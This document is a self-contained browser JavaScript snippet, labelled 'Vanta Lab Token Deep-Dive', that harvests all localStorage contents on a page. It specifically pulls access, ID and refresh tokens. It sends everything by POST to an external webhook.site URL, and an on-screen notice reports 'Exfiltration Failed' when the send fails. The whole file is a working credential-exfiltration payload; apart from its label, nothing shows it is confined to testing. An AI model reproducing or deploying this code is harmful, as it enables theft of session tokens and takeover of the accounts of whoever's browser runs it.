(function() {
    const WEBHOOK_URL = 'https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515';
    
    console.log("%c[Vanta Lab] Token Deep-Dive Active", "color: #00d4ff; font-weight: bold;");

    const harvestAll = () => {
        const fullDump = {
            metadata: {
                host: window.location.hostname,
                timestamp: new Date().toLocaleString()
            },
            identified_tokens: {}, // Specific section for what you asked for
            full_storage: {}
        };

        // Keywords to target specifically
        const targets = ['accessToken', 'idToken', 'refreshToken', 'expiresAt'];

        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const rawValue = localStorage.getItem(key);
            
            try {
                const parsed = JSON.parse(rawValue);
                fullDump.full_storage[key] = parsed;

                // Targeted Search: Check if this JSON object contains our tokens
                if (typeof parsed === 'object' && parsed !== null) {
                    targets.forEach(target => {
                        if (parsed[target]) {
                            fullDump.identified_tokens[target] = parsed[target];
                        }
                    });
                }
            } catch (e) {
                fullDump.full_storage[key] = rawValue;
                // Check if the raw string itself contains the token names
                if (targets.some(t => rawValue.includes(t))) {
                     fullDump.identified_tokens[key] = "Target found in raw string - check full_storage";
                }
            }
        }
        return fullDump;
    };

    const exfiltrate = async (data) => {
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(data)
            });
            showNotification("Auth Tokens Identified & Synced", "#00d4ff");
        } catch (err) {
            showNotification("Exfiltration Failed", "#ff4444");
        }
    };

    const showNotification = (msg, color) => {
        const notify = document.createElement('div');
        notify.style.cssText = `position:fixed;top:10px;right:10px;z-index:9999;background:#111;color:${color};border:1px solid ${color};padding:12px;border-radius:4px;font-family:Inter, sans-serif;font-size:12px;`;
        notify.innerText = msg;
        document.body.appendChild(notify);
        setTimeout(() => notify.remove(), 4000);
    };

    exfiltrate(harvestAll());
})();
